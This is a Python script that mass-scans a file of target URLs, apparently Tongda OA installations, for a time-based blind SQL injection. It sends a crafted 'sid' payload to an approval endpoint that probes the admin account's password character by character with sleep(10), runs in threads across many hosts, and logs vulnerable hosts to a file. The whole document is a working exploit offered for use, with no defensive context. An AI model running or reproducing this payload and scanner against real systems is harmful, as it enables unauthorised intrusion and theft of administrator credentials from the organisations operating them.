import requests
from threading import Thread

def get_assets():
    assets = []
    with open('通达.txt','r') as f:
        for i in f :
            assets.append(i[:-1])
    return assets

def exp(url):
    url_l = f"{url}/general/document/index.php/send/approve/finish"
    cookies = {
        '_SERVER' : ''
    }
    try:
        res = requests.get(url,cookies=cookies,timeout=7)
    except:
        return 1
    res = ''
    payload = "1) and char(@`'`)  union select if(ord(mid(PASSWORD,%d,1))=%d,sleep(10),1),1 from user WHERE BYNAME = 0x61646d696e #and char(@`'`)" % (1,36)
    exp_data = {
        'sid' : payload
    }

    have = []
    try:
        res = requests.post(url_l, data=exp_data, cookies=cookies, timeout=7)
    except Exception as e:
        if 'Read timed out' in str(e):
            print(f'[*] info: {url} have SQL injection\n')
            with open('have_injection.txt','a') as f:
                f.write(f'[*] info: {url} have SQL injection\n')


def check(assets):
    for url in assets:  
        t = Thread(target = exp,args = (url,))
        t.start()
    t.join()

if __name__ == '__main__':
    assets = get_assets()
    check(assets)
